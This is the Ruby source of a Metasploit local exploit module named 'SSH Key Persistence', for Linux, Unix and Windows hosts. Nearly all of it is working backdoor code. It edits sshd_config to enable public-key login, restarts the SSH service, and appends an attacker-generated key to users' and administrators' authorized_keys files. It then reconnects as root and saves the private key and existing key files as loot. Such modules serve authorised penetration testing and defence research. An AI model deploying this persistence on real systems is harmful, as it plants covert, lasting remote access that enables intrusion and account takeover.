##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'sshkey'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Post::Linux::User
  include Msf::Exploit::Remote::SSH
  include Msf::Post::Windows::UserProfiles
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Local::Persistence
  include Msf::Exploit::Deprecated
  moved_from 'post/windows/manage/sshkey_persistence'
  moved_from 'post/linux/manage/sshkey_persistence'

  # ssh_socket
  attr_accessor :ssh_socket

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SSH Key Persistence',
        'Description' => %q{
          This module will add an SSH key to a specified user (or all), to allow
          remote login via SSH at any time.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Dean Welch <dean_welch[at]rapid7.com>', # windows
          'h00die <mike@shorebreaksecurity.com>' # linux
        ],
        'Platform' => [ 'win', 'linux', 'unix' ],
        'Arch' => [
          ARCH_CMD,
        ],
        'Targets' => [
          [
            'Automatic', {
              # this is causing
              # [msf](Jobs:2 Agents:1) exploit(multi/persistence/sshkey) >
              # [-] Exploit failed: NoMethodError undefined method `>' for nil:NilClass
              #
              # 'Type' => :ssh_interact,
              # 'DefaultOptions' => {
              #  'PAYLOAD' => 'generic/ssh/interact'
              # },
              ##
              # 'Payload' => {
              #  'Compat' => {
              #    'PayloadType' => 'ssh_interact'
              #  }
              # }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'SessionTypes' => [ 'meterpreter'], # no shell so we can detect OS automatically
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_fs_mkdir
              stdapi_fs_separator
            ]
          }
        },
        'References' => [
          ['URL', 'https://attack.mitre.org/techniques/T1098/004/']
        ],
        'DisclosureDate' => '1995-01-01', # ssh first release
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION, EVENT_DEPENDENT],
          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES]
        }
      )
    )

    register_options(
      [
        OptString.new('USER', [false, 'User to add SSH key to (Default: all users on box)' ]),
        OptPath.new('PUBKEY', [false, 'Public Key File to use. (Default: Create a new one)' ]),
        OptPath.new('PRIVKEY', [false, 'Private Key File to use. (Default: Create a new one)' ]),
        OptString.new('SSHD_CONFIG', [true, 'sshd_config file', '/etc/ssh/sshd_config' ]),
        # OptString.new('SSHD_CONFIG', [true, 'sshd_config file', 'C:\ProgramData\ssh\sshd_config' ]),
        OptBool.new('ADMIN', [true, 'Add keys for administrator accounts', false ]),
        OptPort.new('SSHPORT', [true, 'SSH port', 22]),
      ]
    )

    register_advanced_options(
      [
        OptBool.new('EDIT_CONFIG', [true, 'Edit ssh config to allow public key authentication', false ]),
        OptString.new('ADMIN_KEY_FILE', [true, 'Admin key file', 'C:\ProgramData\ssh\administrators_authorized_keys' ]),
        OptBool.new('CREATESSHFOLDER', [true, 'If no .ssh folder is found, create it for a user', false ]),
      ]
    )
    deregister_options('WritableDir', 'RHOSTS')
  end

  def check
    return CheckCode::Safe("Unable to read SSH config: #{datastore['SSHD_CONFIG']}") unless readable?(datastore['SSHD_CONFIG'])

    if readable?(datastore['SSHD_CONFIG'])
      sshd_config = read_file(datastore['SSHD_CONFIG'])
      pub_key_allowed = pub_key_auth_allowed?(sshd_config)

      return CheckCode::Detected('Pubkey auth is enabled') if pub_key_allowed

      if !pub_key_allowed && datastore['EDIT_CONFIG'] && writable?(sshd_config)
        return CheckCode::Detected('Pubkey auth is NOT enabled, will edit config to allow it')
      end

      if !pub_key_allowed && datastore['EDIT_CONFIG'] && !writable?(sshd_config)
        return CheckCode::Detected("Pubkey auth is NOT enabled, and unable to write to #{sshd_config}")
      end

      if !pub_key_allowed && !datastore['EDIT_CONFIG']
        return CheckCode::Safe('Pubkey auth is NOT enabled, and you have not selected to edit the config')
      end
    else
      print_warning("Unable to read #{datastore['SSHD_CONFIG']}")
    end
    CheckCode::Detected('Pubkey Authentication status unknown, likely defaults to enabled')
  end

  # determine who our target user account is
  def target_user
    return datastore['USER'] unless datastore['USER'].blank?

    case client.platform
    when 'osx', 'freebsd', 'bsd', 'linux'
      whoami
    else
      cmd_exec('echo %USERNAME%')
    end
  end

  def install_persistence
    sep = session.fs.file.separator

    sshd_config = read_file(datastore['SSHD_CONFIG'])

    print_status('Checking SSH Permissions')
    if !pub_key_auth_allowed?(sshd_config) && datastore['EDIT_CONFIG']
      print_status('Enabling Pubkey Authentication')
      enable_pub_key_auth(sshd_config)
      restart_openssh
    end

    auth_key_file = auth_key_file_name(sshd_config)

    print_status("Authorized Keys File: #{auth_key_file}")

    auth_key_folder = auth_key_file.split('/')[0...-1].join(sep)
    auth_key_file = auth_key_file.split('/')[-1]

    ssh_keys = get_ssh_keys

    # windows specific
    if datastore['ADMIN'] # SSH keys for admin accounts are stored in a separate location
      admin_auth_key_folder = datastore['ADMIN_KEY_FILE'].split(sep)[0...-1].join(sep)
      admin_auth_key_file = datastore['ADMIN_KEY_FILE'].split(sep)[-1]

      print_status("Admin Authorized Keys File: #{admin_auth_key_file}")

      write_key([admin_auth_key_folder], admin_auth_key_file, sep, ssh_keys)
    end

    user = target_user
    vprint_status("Targetting user #{user}")

    paths = [] # likely never bigger than 1 element
    case client.platform
    when 'osx', 'freebsd', 'bsd', 'linux'
      home = get_home_dir(user)
      paths << "#{home}#{sep}#{auth_key_folder}"
    else
      grab_user_profiles.each do |profile|
        paths << "#{profile['ProfileDir']}#{sep}#{auth_key_folder}" if profile['USER'] == user
      end
    end

    vprint_status("#{user} ssh path: #{paths}")

    if datastore['CREATESSHFOLDER'] == true
      create_ssh_folder(paths)
    end

    paths = paths.select { |d| directory?(d) }
    unless paths.empty?
      write_key(paths, auth_key_file, sep, ssh_keys)
    end

    # connect to our new session
    ssh_opts = ssh_client_defaults.merge({
      auth_methods: ['publickey'],
      key_data: [ ssh_keys['priv'] ],
      port: datastore['SSHPORT']
    })

    fail_with(Failure::NoAccess, 'Failed to authenticate with SSH.') unless do_sshlogin(datastore['RHOST'], 'root', ssh_opts)

    handler(ssh_socket)
    @timeout ? ssh_socket.shutdown! : ssh_socket.close
  end

  def enable_pub_key_auth(sshd_config)
    sshd_config = sshd_config.sub(/^.*(PubkeyAuthentication).*$/, 'PubkeyAuthentication yes')
    write_file(datastore['SSHD_CONFIG'], sshd_config)
  end

  # create SSH session.
  # based on the ssh_opts can this be key or password based.
  # if login is successfull, return true else return false. All other errors will trigger an immediate fail
  def do_sshlogin(ip, user, ssh_opts)
    begin
      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
        self.ssh_socket = Net::SSH.start(ip, user, ssh_opts)
      end
    rescue Rex::ConnectionError
      fail_with(Failure::Unreachable, 'Disconnected during negotiation')
    rescue Net::SSH::Disconnect, ::EOFError
      fail_with(Failure::Disconnected, 'Timed out during negotiation')
    rescue Net::SSH::AuthenticationFailed
      return false
    rescue Net::SSH::Exception => e
      fail_with(Failure::Unknown, "SSH Error: #{e.class} : #{e.message}")
    end

    fail_with(Failure::Unknown, 'Failed to start SSH socket') unless ssh_socket
    return true
  end

  def pub_key_auth_allowed?(sshd_config)
    /^PubkeyAuthentication\s+(?<pub_key>yes|no)/ =~ sshd_config
    if pub_key && pub_key == 'no'
      print_error('Pubkey Authentication disabled')
      return false
    elsif pub_key
      vprint_good("Pubkey set to #{pub_key}")
    else
      vprint_warning('Pubkey not found in config')
      # still return true since that should be the system default
    end
    true
  end

  def auth_key_file_name(sshd_config)
    %r{^AuthorizedKeysFile\s+(?<auth_key_file>[\w%/.]+)} =~ sshd_config
    if auth_key_file
      auth_key_file = auth_key_file.gsub('%h', '')
      auth_key_file = auth_key_file.gsub('%%', '%')
      if auth_key_file.start_with? '/'
        auth_key_file = auth_key_file[1..]
      end
    else
      auth_key_file = '.ssh/authorized_keys'
    end
    auth_key_file
  end

  def create_ssh_folder(paths)
    vprint_status("Attempting to create ssh folders that don't exist")
    paths.each do |p|
      unless directory?(p)
        print_status("Creating #{p} folder")
        session.fs.dir.mkdir(p)
      end
    end
  end

  def restart_openssh
    case client.platform
    when 'osx', 'freebsd', 'bsd', 'linux'
      cmd_exec('service ssh restart') # take a guess
      cmd_exec('systemctl restart sshd')
    else
      cmd_exec('net stop "OpenSSH SSH Server"')
      cmd_exec('net start "OpenSSH SSH Server"')
    end
  end

  def set_pub_key_file_permissions(file)
    case client.platform
    when 'osx', 'freebsd', 'bsd', 'linux'
      chmod(file, 0o600)
    else
      cmd_exec("icacls #{file} /inheritance:r")
      cmd_exec("icacls #{file} /grant SYSTEM:(F)")
      cmd_exec("icacls #{file} /grant BUILTIN\\Administrators:(F)")
    end
  end

  def session_db_id
    session.db_record.id if session.db_record
  end

  def get_ssh_keys
    if datastore['PUBKEY'].nil?
      key = SSHKey.generate
      our_pub_key = key.ssh_public_key
      our_priv_key = key.private_key.to_s
      loot_path = store_loot('id_rsa', 'text/plain', session, key.private_key, 'ssh_id_rsa', 'OpenSSH Private Key File')
      print_good("Storing new private key as #{loot_path}")

    else
      our_pub_key = ::File.read(datastore['PUBKEY'])
      our_priv_key = ::File.read(datastore['PRIVKEY'])
    end
    { 'pub' => our_pub_key, 'priv' => our_priv_key }
  end

  def write_key(paths, auth_key_file, sep, keys)
    paths.each do |path|
      path.chomp!
      authorized_keys = "#{path}#{sep}#{auth_key_file}"
      if exists?(authorized_keys)
        loot_location = store_loot('ssh.authorized_keys', 'text/plain', session, read_file(authorized_keys), 'authorized_keys', 'Authorized Keys File')
        print_status("Backup of #{authorized_keys} stored in #{loot_location}")
        @clean_up_rc << "upload #{loot_location} #{authorized_keys}\n"
      end
      print_status("Adding key to #{authorized_keys}")
      append_file(authorized_keys, "\n#{keys['pub']}")
      print_good('Key Added')
      set_pub_key_file_permissions(authorized_keys)
      next unless datastore['PUBKEY'].nil?

      path_array = path.split(sep)
      path_array.pop
      user = path_array.pop
      credential_data = {
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: refname,
        private_type: :ssh_key,
        private_data: key.private_key.to_s,
        username: user,
        workspace_id: myworkspace_id
      }

      create_credential(credential_data)
    end
  end
end
